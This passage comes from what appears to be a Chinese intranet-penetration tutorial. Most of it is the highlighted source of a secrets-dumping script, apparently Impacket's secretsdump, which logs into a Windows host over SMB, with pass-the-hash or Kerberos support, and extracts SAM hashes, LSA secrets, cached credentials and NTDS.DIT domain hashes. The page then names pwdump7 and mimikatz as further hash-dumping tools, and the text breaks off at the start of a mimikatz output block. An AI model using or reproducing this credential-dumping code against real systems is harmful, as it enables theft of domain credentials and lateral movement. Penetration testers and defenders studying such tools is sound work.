class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.__lmhash, self.__nthash = options.hashes.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)</span><br><span class="line">        <span class="keyword">if</span> self.__doKerberos:</span><br><span class="line">            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,</span><br><span class="line">                                               self.__nthash, self.__aesKey, self.__kdcHost)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.__remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> self.__username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">False</span></span><br><span class="line">                self.__useVSSMethod = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> self.__systemHive:</span><br><span class="line">                    localOperations = LocalOperations(self.__systemHive)</span><br><span class="line">                    bootKey = localOperations.getBootKey()</span><br><span class="line">                    <span class="keyword">if</span> self.__ntdsFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># Let&#x27;s grab target&#x27;s configuration about LM Hashes storage</span></span><br><span class="line">                        self.__noLMHash = localOperations.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">import</span> binascii</span><br><span class="line">                    bootKey = binascii.unhexlify(self.__bootkey)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">True</span></span><br><span class="line">                bootKey = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        self.connect()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">if</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                            <span class="comment"># SMBConnection failed. That might be because there was no way to log into the</span></span><br><span class="line">                            <span class="comment"># target system. We just have a last resort. Hope we have tickets cached and that they</span></span><br><span class="line">                            <span class="comment"># will work</span></span><br><span class="line">                            logging.debug(<span class="string">&#x27;SMBConnection didn\&#x27;t work, hoping Kerberos will help (%s)&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)</span><br><span class="line">                    self.__remoteOps.setExecMethod(self.__options.exec_method)</span><br><span class="line">                    <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">or</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        self.__remoteOps.enableRegistry()</span><br><span class="line">                        bootKey             = self.__remoteOps.getBootKey()</span><br><span class="line">                        <span class="comment"># Let&#x27;s check whether target system stores LM Hashes</span></span><br><span class="line">                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    self.__canProcessSAMLSA = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;STATUS_USER_SESSION_DELETED&#x27;</span>) <span class="keyword">and</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> \</span><br><span class="line">                        <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="comment"># Giving some hints here when SPN target name validation is set to something different to Off</span></span><br><span class="line">                        <span class="comment"># This will prevent establishing SMB connections using TGS for SPNs different to cifs/</span></span><br><span class="line">                        logging.error(<span class="string">&#x27;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.error(<span class="string">&#x27;RemoteOperations failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If RemoteOperations succeeded, then we can extract SAM and LSA</span></span><br><span class="line">            <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__canProcessSAMLSA:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SAMFileName         = self.__remoteOps.saveSAM()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SAMFileName         = self.__samHive</span><br><span class="line"></span><br><span class="line">                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)</span><br><span class="line">                    self.__SAMHashes.dump()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__SAMHashes.export(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logging.error(<span class="string">&#x27;SAM hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SECURITYFileName = self.__remoteOps.saveSECURITY()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SECURITYFileName = self.__securityHive</span><br><span class="line"></span><br><span class="line">                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,</span><br><span class="line">                                                   isRemote=self.__isRemote, history=self.__history)</span><br><span class="line">                    self.__LSASecrets.dumpCachedHashes()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportCached(self.__outputFileName)</span><br><span class="line">                    self.__LSASecrets.dumpSecrets()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportSecrets(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                        <span class="keyword">import</span> traceback</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                    logging.error(<span class="string">&#x27;LSA hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># NTDS Extraction we can try regardless of RemoteOperations failing. It might still work</span></span><br><span class="line">            <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> self.__useVSSMethod <span class="keyword">and</span> self.__remoteOps <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    NTDSFileName = self.__remoteOps.saveNTDS()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    NTDSFileName = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                NTDSFileName = self.__ntdsFile</span><br><span class="line"></span><br><span class="line">            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,</span><br><span class="line">                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,</span><br><span class="line">                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,</span><br><span class="line">                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,</span><br><span class="line">                                           outputFileName=self.__outputFileName, justUser=self.__justUser,</span><br><span class="line">                                           printUserStatus= self.__printUserStatus)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.__NTDSHashes.dump()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                    <span class="keyword">import</span> traceback</span><br><span class="line">                    traceback.print_exc()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;ERROR_DS_DRA_BAD_DN&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># We don&#x27;t store the resume file if this error happened, since this error is related to lack</span></span><br><span class="line">                    <span class="comment"># of enough privileges to access DRSUAPI.</span></span><br><span class="line">                    resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                    <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        os.unlink(resumeFile)</span><br><span class="line">                logging.error(e)</span><br><span class="line">                <span class="keyword">if</span> self.__justUser <span class="keyword">and</span> <span class="built_in">str</span>(e).find(<span class="string">&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    logging.info(<span class="string">&quot;You just got that error because there might be some duplicates of the same name. &quot;</span></span><br><span class="line">                                 <span class="string">&quot;Try specifying the domain name for the user as well. It is important to specify it &quot;</span></span><br><span class="line">                                 <span class="string">&quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    logging.info(<span class="string">&#x27;Something wen\&#x27;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&#x27;</span>)</span><br><span class="line">            self.cleanup()</span><br><span class="line">        <span class="keyword">except</span> (Exception, KeyboardInterrupt) <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            logging.error(e)</span><br><span class="line">            <span class="keyword">if</span> self.__NTDSHashes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(e, KeyboardInterrupt):</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        answer =  <span class="built_in">input</span>(<span class="string">&quot;Delete resume session file? [y/N] &quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> answer.upper() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> answer == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                        resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                        <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                            os.unlink(resumeFile)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.cleanup()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cleanup</span>(<span class="params">self</span>):</span></span><br><span class="line">        logging.info(<span class="string">&#x27;Cleaning up... &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> self.__remoteOps:</span><br><span class="line">            self.__remoteOps.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__SAMHashes:</span><br><span class="line">            self.__SAMHashes.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__LSASecrets:</span><br><span class="line">            self.__LSASecrets.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__NTDSHashes:</span><br><span class="line">            self.__NTDSHashes.finish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Process command-line arguments.</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Explicitly changing the stdout encoding format</span></span><br><span class="line">    <span class="keyword">if</span> sys.stdout.encoding <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># Output is redirected to a file</span></span><br><span class="line">        sys.stdout = codecs.getwriter(<span class="string">&#x27;utf8&#x27;</span>)(sys.stdout)</span><br><span class="line"></span><br><span class="line">    print(version.BANNER)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(add_help = <span class="literal">True</span>, description = <span class="string">&quot;Performs various techniques to dump secrets from &quot;</span></span><br><span class="line">                                                      <span class="string">&quot;the remote machine without executing any agent there.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;target&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&#x27;</span></span><br><span class="line">                                                       <span class="string">&#x27; (if you want to parse local files)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ts&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Adds timestamp to every logging output&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Turn DEBUG output ON&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-system&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SYSTEM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-bootkey&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;bootkey for SYSTEM hive&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-security&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SECURITY hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-sam&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SAM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ntds&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTDS.DIT file to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-resumefile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;resume file name to resume NTDS.DIT session dump (only &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;available to DRSUAPI approach). This file will also be used to keep updating the session\&#x27;s &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;state&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-outputfile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;base output filename. Extensions will be added for sam, secrets, cached and ntds&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-use-vss&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Use the VSS method insead of default DRSUAPI&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-exec-method&#x27;</span>, choices=[<span class="string">&#x27;smbexec&#x27;</span>, <span class="string">&#x27;wmiexec&#x27;</span>, <span class="string">&#x27;mmcexec&#x27;</span>], nargs=<span class="string">&#x27;?&#x27;</span>, default=<span class="string">&#x27;smbexec&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote exec &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;method to use at target (only when using -use-vss). Default: smbexec&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;display options&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-user&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&#x27;USERNAME&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;Implies also -just-dc switch&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-ntlm&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes only)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-pwd-last-set&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\&#x27;t apply to -outputfile data&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-user-status&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Display whether or not the user is disabled&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-history&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Dump password history, and LSA secrets OldVal&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;authentication&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    group.add_argument(<span class="string">&#x27;-hashes&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;LMHASH:NTHASH&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTLM hashes, format is LMHASH:NTHASH&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-no-pass&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;don\&#x27;t ask for password (useful for -k)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-k&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Use Kerberos authentication. Grabs credentials from ccache file &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&#x27;</span></span><br><span class="line">                             <span class="string">&#x27; the ones specified in the command line&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-aesKey&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;hex key&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;AES key to use for Kerberos Authentication&#x27;</span></span><br><span class="line">                                                                            <span class="string">&#x27; (128 or 256 bits)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-keytab&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Read keys for SPN from keytab file&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;connection&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-dc-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,metavar = <span class="string">&quot;ip address&quot;</span>,  <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the domain controller. If &#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;ommited it use the domain part (FQDN) specified in the target parameter&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-target-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&quot;ip address&quot;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the target machine. If omitted it will use whatever was specified as target. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;This is useful when target is the NetBIOS name and you cannot resolve it&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Init the example&#x27;s logger theme</span></span><br><span class="line">    logger.init(options.ts)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.debug <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line">        <span class="comment"># Print the Library&#x27;s installation path</span></span><br><span class="line">        logging.debug(version.getInstallationPath())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">    domain, username, password, remoteName = re.<span class="built_in">compile</span>(<span class="string">&#x27;(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)&#x27;</span>).match(</span><br><span class="line">        options.target).groups(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#In case the password contains &#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;@&#x27;</span> <span class="keyword">in</span> remoteName:</span><br><span class="line">        password = password + <span class="string">&#x27;@&#x27;</span> + remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        remoteName = remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.just_dc_user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user switch is not supported in VSS mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user not compatible in LOCAL mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Having this switch on implies not asking for anything else.</span></span><br><span class="line">            options.just_dc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in VSS mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> options.system <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.bootkey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Either the SYSTEM hive or bootkey is required for local parsing, check help&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            options.target_ip = remoteName</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> domain <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            domain = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.keytab <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> password == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.hashes <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.no_pass <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> options.aesKey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line">            password = getpass(<span class="string">&quot;Password:&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.aesKey <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    dumper = DumpSecrets(remoteName, username, password, domain, options)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dumper.dump()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">            <span class="keyword">import</span> traceback</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">        logging.error(e)</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/57.png?raw=true" alt="image-20200803152140006"></p><p>还可以用<strong>pwdump7.exe</strong>直接获取，下载地址如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.tarasco.org&#x2F;security&#x2F;pwdump_7&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/58.png?raw=true" alt="image-20200803153049297"></p><p>还有<strong>mimikatz</strong>也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz</span><br></pre></td></tr></table></figure><p>运行后如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 